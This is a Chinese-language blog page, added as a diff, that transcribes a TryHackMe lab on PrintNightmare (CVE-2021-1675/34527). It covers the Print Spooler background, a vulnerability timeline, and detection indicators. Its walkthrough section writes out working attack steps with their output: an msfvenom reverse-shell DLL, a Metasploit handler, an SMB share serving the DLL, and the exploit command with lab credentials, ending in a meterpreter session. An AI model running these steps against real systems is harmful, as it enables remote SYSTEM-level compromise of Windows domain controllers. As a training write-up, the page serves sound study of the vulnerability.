@@ -1,0 +1,521 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THMPrintNightmare | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction这个房间将从进攻和防御的角度来讨论 Printnightmare 漏洞。 根据 Microsoft 的说法，“当 Windows Print Spooler 服务不正确地执行特权文件操作时，就会存在远程代码执行漏洞。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。攻击者随后可以安装程序；查看、更改或删除程序 数据；或创建具有完全用户权限的新帐户”。 学习目标">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THMPrintNightmare">
+<meta property="og:url" content="http://mikannse.space/2024/04/28/THMPrintNightmare/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="Introduction这个房间将从进攻和防御的角度来讨论 Printnightmare 漏洞。 根据 Microsoft 的说法，“当 Windows Print Spooler 服务不正确地执行特权文件操作时，就会存在远程代码执行漏洞。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。攻击者随后可以安装程序；查看、更改或删除程序 数据；或创建具有完全用户权限的新帐户”。 学习目标">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-04-28T14:48:30.000Z">
+<meta property="article:modified_time" content="2024-06-14T03:28:13.964Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/04/28/THMPrintNightmare/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'THMPrintNightmare',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-06-14 11:28:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">THMPrintNightmare</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-28T14:48:30.000Z" title="发表于 2024-04-28 22:48:30">2024-04-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-14T03:28:13.964Z" title="更新于 2024-06-14 11:28:13">2024-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="THMPrintNightmare"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>这个房间将从进攻和防御的角度来讨论 Printnightmare 漏洞。</p>
+<p>根据 Microsoft 的说法，“当 Windows Print Spooler 服务不正确地执行特权文件操作时，就会存在远程代码执行漏洞。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。攻击者随后可以安装程序；查看、更改或删除程序 数据；或创建具有完全用户权限的新帐户”。</p>
+<p>学习目标：在这个房间中，您将了解 PrintNightmare 漏洞是什么，以及如何利用和缓解该漏洞。 您还将学习使用 Windows 事件日志和 Wireshark 的检测机制。</p>
+<p>结果：因此，您将准备好保护您的组织免受任何潜在的 PrintNightmare 攻击。</p>
+<p>学习先决条件：在加入此房间之前，您应该熟悉 Wireshark、Windows 事件日志、Linux 基础知识和 Meterpreter。</p>
+<h1 id="Windows-Print-Spooler-Service"><a href="#Windows-Print-Spooler-Service" class="headerlink" title="Windows Print Spooler Service"></a>Windows Print Spooler Service</h1><p>Microsoft 将<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc">打印后台处理程序服务</a> 定义为在每个计算机系统上运行的服务 。 正如您可以从名称中猜出的那样，打印后台处理程序服务管理打印过程。 打印假脱机程序的职责是管理打印作业、接收要打印的文件、对它们进行排队和调度。</p>
+<p>您只需导航到 Windows 系统上的“服务”即可启动/停止/暂停/恢复打印后台处理程序服务。</p>
+<p><strong>服务</strong>：</p>
+<p><img src="https://i.ibb.co/RT53ySK/spooleerr.png" alt="img"></p>
+<p><strong>后台打印程序属性（服务）</strong>：</p>
+<p><img src="https://i.ibb.co/3WPvSJY/print.png" alt="img"></p>
+<p>打印后台处理程序服务确保为发送打印作业的计算机提供足够的资源。 还记得早期用户必须等待打印作业完成才能执行其他操作吗？ 好吧，打印后台处理程序服务为我们解决了这个问题。</p>
+<p>打印后台处理程序服务允许系统充当打印客户端、管理客户端或打印服务器。 还需要注意的是，默认情况下，所有 Windows 客户端和服务器中都会启用打印后台处理程序服务。 计算机上必须有打印后台处理程序服务才能连接到打印机。 打印机制造商提供了一些第三方软件和驱动程序，它们不需要您启用打印后台处理程序服务。 尽管如此，大多数公司还是更喜欢使用打印后台处理程序服务。</p>
+<p>域控制器主要使用打印后台处理程序服务进行打印机修剪（删除网络上不再使用的打印机并已作为对象添加到 Active Directory 的过程）。 打印机修剪消除了用户使用不存在的打印机的问题。 您很快就会知道我们为什么提到域控制器。</p>
+<h1 id="Remote-Code-Execution-Vulnerability"><a href="#Remote-Code-Execution-Vulnerability" class="headerlink" title="Remote Code Execution Vulnerability"></a>Remote Code Execution Vulnerability</h1><p>为了更好地了解 PrintNightmare 漏洞（或任何漏洞），您应该养成通过阅读有关任何 Windows 特定 CVE 的 Microsoft 文章或浏览 Internet 查找社区和供应商博客文章来研究漏洞的习惯。</p>
+<p>如果 CVE-2021-1675 和 CVE-2021-34527 彼此相关，则会出现一些混淆。 它们具有相同的名称：Windows Print Spooler 远程代码执行漏洞，并且都与 Print Spooler 有关。</p>
+<p>正如 <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">Microsoft</a> 在常见问题解答中所述，PrintNightmare (CVE-2021-34527) 漏洞“<em>与 分配了 CVE-2021-1675 的漏洞。</em> <em>攻击向量也不同。”</em></p>
+<p>微软所说的攻击媒介是什么意思？ 为了回答这个问题，让我们看看这两个漏洞之间的差异并附上事件时间表。</p>
+<p>根据 <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">Microsoft</a> 的定义，PrintNightmare 漏洞是“当 Windows Print Spooler 服务不正确执行特权文件时存在的远程代码执行漏洞” 成功利用此漏洞的攻击者可以使用系统权限<strong>运行任意代码</strong>，然后可以安装程序、查看、更改或删除数据；或者创建具有完全用户权限的新帐户。</p>
+<p>运行任意代码涉及在受害者的计算机上执行攻击者选择和偏好的任何命令。<br>假设您有机会查看 Microsoft 上的两个 CVE。 您会注意到两者的攻击向量不同。</p>
+<p>要利用 CVE-2021-1675 漏洞，攻击者需要对计算机具有直接或本地访问权限，才能使用恶意 DLL 文件来提升权限。 要成功利用CVE-2021-34527漏洞，攻击者可以远程注入恶意DLL文件。</p>
+<p>CVE-2021-1675 的漏洞指标：</p>
+<p><img src="https://i.ibb.co/fd1m86s/spooleerr1.png" alt="img"></p>
+<p>CVE-2021-34527 的漏洞指标：</p>
+<p><img src="https://i.ibb.co/tKZMCXB/34527.png" alt="img"></p>
+<p><strong>时间线：</strong></p>
+<p>2021 年 6 月 8 日：Microsoft 发布了针对打印后台处理程序服务中的权限提升漏洞的补丁 (CVE-2021-1675)。</p>
+<p>2021年6月21日：微软修改了该漏洞，并将其分类更改为远程代码执行（RCE）。</p>
+<p>2021 年 6 月 27 日：中国网络安全公司 QiAnXin <a target="_blank" rel="noopener" href="https://twitter.com/RedDrip7/status/1409353110187757575">发布了一段视频</a> 演示本地权限升级 (LPE) 和 RCE。</p>
+<p>2021 年 7 月 2 日：Microsoft 在打印后台处理程序服务中分配了一个新的 CVE，即所谓的 PrintNightmare 漏洞 (CVE-2021-34527)。</p>
+<p>2021 年 7 月 6 日：Microsoft 发布了一个带外补丁（在正常发布时间以外的某个时间发布的补丁）来解决 CVE-2021-34527，并提供了额外的解决方法来防御该漏洞。</p>
+<p><strong>是什么让 PrintNightmare 变得危险？</strong></p>
+<p>它可以通过网络被利用； 攻击者不需要直接访问机器。<br>概念验证已在互联网上公开。<br>后台打印程序服务在域控制器和具有系统权限的计算机上通过 DEFAULT 启用。</p>
+<h1 id="Try-it-yourself"><a href="#Try-it-yourself" class="headerlink" title="Try it yourself!"></a>Try it yourself!</h1><p>按照下面列出的步骤，通过攻击箱利用 PrintNightmare 漏洞来利用域控制器。</p>
+<p>在下面的示例终端输出中，受害者是“10.10.237.131”，攻击者是“192.168.0.100”。</p>
+<p>在继续之前，请在桌面上创建 2 个目录：</p>
+<ul>
+<li><code>pn</code> - 这将包含漏洞利用。</li>
+<li><code>share</code> - 此目录 (<strong>/root/Desktop/share</strong>) 将包含使用 msfvenom 创建的恶意 DLL。</li>
+</ul>
+<p>下载 <strong>CVE-2021-1675.py</strong>：</p>
+<p>从 GitHub 克隆 CVE-2021-1675 漏洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# git clone https://github.com/tryhackme/CVE-2021-1675.git </span><br><span class="line">Cloning into 'CVE-2021-1675'...</span><br><span class="line">remote: Enumerating objects: 173, done.</span><br><span class="line">remote: Counting objects: 100% (173/173), done.</span><br><span class="line">remote: Compressing objects: 100% (105/105), done.</span><br><span class="line">remote: Total 173 (delta 62), reused 133 (delta 36), pack-reused 0</span><br><span class="line">Receiving objects: 100% (173/173), 1.45 MiB | 452.00 KiB/s, done.</span><br><span class="line">Resolving deltas: 100% (62/62), done.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在启动 <strong>Metasploit</strong> 之前，创建恶意 DLL。</p>
+<p><strong>注意</strong>：在下面的终端输出中，攻击者是“192.168.0.100”。 您需要将“192.168.0.100”替换为您的攻击盒 IP（或 OpenVPN IP）。</p>
+<p>您将使用 <strong>msfvenom</strong> 创建恶意 DLL。</p>
+<p>使用 Msfvenom 创建恶意 DLL</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f dll -o ~/Desktop/share/malicious.dll </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 5120 bytes</span><br><span class="line">Saved as: /root/Desktop/share/malicious.dll</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果运行此命令时看到类似的输出，则应该已成功创建 DLL。</p>
+<p>让我们启动 Metasploit。</p>
+<p>启动 Metasploit</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# msfconsole </span><br><span class="line">=[ metasploit v5.0.101-dev                         ]</span><br><span class="line">+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: To save all commands executed since start up to a file, use the makerc command</span><br><span class="line"></span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦 Metasploit 成功加载，您需要配置处理程序以接收来自恶意 DLL 的传入连接。</p>
+<p>运行以下命令选项：</p>
+<ul>
+<li><code>use exploit/multi/handler</code></li>
+<li><code>set payload windows/x64/meterpreter/reverse_tcp</code></li>
+<li><code>set lhost VALUE</code> </li>
+<li><code>set lport VALUE</code></li>
+</ul>
+<p><strong>注意</strong>：<strong>LHOST</strong> 和 <strong>LPORT</strong> 的值必须与您用于创建恶意 DLL 的值相同。</p>
+<p>配置 Metasploit 监听器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.0.100</span><br><span class="line">lhost =&gt; 192.168.0.100 msf5 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，运行它，以便它将主动等待连接。</p>
+<p>启动侦听器以接受传入连接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run -j </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP on 192.168.0.100:4444</span><br></pre></td></tr></tbody></table></figure>
+
+<p>“-j”只是意味着将其作为作业运行。</p>
+<p>检查 Metasploit 作业状态</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; jobs</span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">====</span><br><span class="line"></span><br><span class="line">  Id  Name                    Payload                              Payload opts</span><br><span class="line">  --  ----                    -------                              ------------</span><br><span class="line">  0   Exploit: multi/handler  windows/x64/meterpreter/reverse_tcp  tcp://192.168.0.100:4444</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>太好了，现在您需要将恶意 DLL 托管在攻击者机器上运行的 SMB 共享中。 我们将在此示例中使用 <strong>AttackBox</strong>。</p>
+<p>以下是如何使用 <strong>Impacket</strong> 中的 <strong>smbserver.py</strong> 执行此操作。</p>
+<p>使用 Impacket 启动 SMB 共享以托管恶意 DLL</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# smbserver.py share /root/Desktop/share/ -smb2support </span><br><span class="line">Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对上图中命令的简单解释：</p>
+<ol>
+<li>这是用于执行漏洞利用的 SMB 共享的名称。 （示例：<strong>\ATTACKER_IP\share\malicious.dll</strong>）</li>
+<li>这是存储恶意DLL的本地文件夹。 （示例：**/root/Desktop/share/malicious.dll**）</li>
+</ol>
+<p>在我们盲目地对目标执行漏洞利用之前，我们首先检查目标是否符合利用它的标准。</p>
+<p>检查目标是否容易受到此漏洞的攻击</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# rpcdump.py @10.10.237.131 | egrep 'MS-RPRN|MS-PAR' </span><br><span class="line">Protocol: [MS-RPRN]: Print System Remote Protocol </span><br><span class="line">Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol</span><br></pre></td></tr></tbody></table></figure>
+
+<p>是的，看起来不错。 终于到了运行漏洞利用的时候了。 导航到从 GitHub 下载漏洞利用代码的位置，该位置应为“/root/Desktop/pn/CVE-2021-1675”。</p>
+<p>我们将使用 Python 脚本利用针对 Windows 2019 域控制器的 PrintNightmare 漏洞。</p>
+<p>利用代码语法</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.237.131 '\\192.168.0.100\share\malicious.dll'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>对上图中命令的简单解释：</p>
+<ul>
+<li><strong>python3.9 CVE-2021-1675.py</strong> -&gt; 您正在指示 Python 运行以下 Python 脚本。 下面的值是脚本成功利用 PrintNightmare 漏洞所需的参数。</li>
+<li><strong>Finance-01.THMdepartment.local</strong> -&gt; 域控制器的名称 (<strong>Finance-01</strong>) 以及域的名称 (<strong>THMdepartment.local</strong>)</li>
+<li><strong>sjohnston:<a href="mailto:mindheartbeauty76@10.10.237.131">mindheartbeauty76@10.10.237.131</a></strong> -&gt; 低权限 Windows 用户帐户的用户名和密码。</li>
+<li><strong>\ATTACKER_IP_ADDRESS\share\malicious.dll</strong> -&gt; 存储恶意 DLL 的 SMB 路径的位置。</li>
+</ul>
+<p>如果一切顺利，您应该会看到类似于下图的输出。</p>
+<p>运行漏洞利用程序</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn/CVE-2021-1675# python3.9 CVE-2021-1675.py Finance-01.THMdepartment.local/sjohnston:mindheartbeauty76@10.10.237.131 '\\192.168.0.100\share\malicious.dll'</span><br><span class="line">[*] Connecting to ncacn_np:10.10.237.131[\PIPE\spoolss]</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL</span><br><span class="line">[*] Executing \??\UNC\192.168.0.100\share\malicious.dll</span><br><span class="line">[*] Try 1...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 2...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 3...</span><br><span class="line">[*] Stage0: 0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在 <strong>Try 3…</strong> 之后，您<strong>可能</strong>会看到 Python 错误，但可以放心地忽略它们。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">On the attacker box, you should see the SMB connection calling for the malicious DLL file.</span><br></pre></td></tr></tbody></table></figure>
+
+<p>受害者连接到恶意 DLL 的 SMB 共享</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">root@attackbox:~/Desktop/pn# ...</span><br><span class="line">[*] Incoming connection (10.10.237.131,55037)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (\,FINANCE-01)</span><br><span class="line">[*] User FINANCE-01\ authenticated successfully</span><br><span class="line">[*] :::00::aaaaaaaaaaaaaaaa</span><br><span class="line">[*] Connecting Share(1:IPC$)</span><br><span class="line">[*] Connecting Share(2:share)</span><br><span class="line">[*] Disconnecting Share(1:IPC$)</span><br><span class="line">[*] Disconnecting Share(2:share)</span><br><span class="line">[*] Closing down connection (10.10.210.90,55037)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，您将获得一次成功的 Meterpreter 会话。</p>
+<p>收到传入连接</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (201283 bytes) to 10.10.237.131 [*] Meterpreter session 1 opened (192.168.0.100:4444 -&gt; 10.10.237.131:55038) at 2021-08-17 17:56:31 +0100</span><br></pre></td></tr></tbody></table></figure>
+
+<h1 id="Indicators-of-Compromise"><a href="#Indicators-of-Compromise" class="headerlink" title="Indicators of Compromise"></a>Indicators of Compromise</h1><p>让我们想象一下最坏的情况，即 THM 部门在 PrintNightmare 的 PoC 发布几天后遭到入侵，而您是 THM 部门的威胁猎人。 您的公司怀疑攻击者使用 PrintNightmare 访问域控制器，您的任务是找到妥协的证据或迹象。 那么，下一个问题是您应该寻找哪些指标来检测 PrintNightmare 攻击？</p>
+<p>攻击者很可能使用 rpcdump.py 扫描易受攻击的主机。 找到存在漏洞的打印服务器后，攻击者可以执行漏洞利用代码（类似于上一个任务中的Python脚本），该代码将加载恶意DLL文件以利用该漏洞。 更具体地说，利用代码将从经过身份验证的用户帐户调用 pcAddPrinterDriverEx() 函数并加载恶意 DLL 文件以利用该漏洞。 pcAddPrinterDriverEx() 函数用于在系统上安装打印机驱动程序。</p>
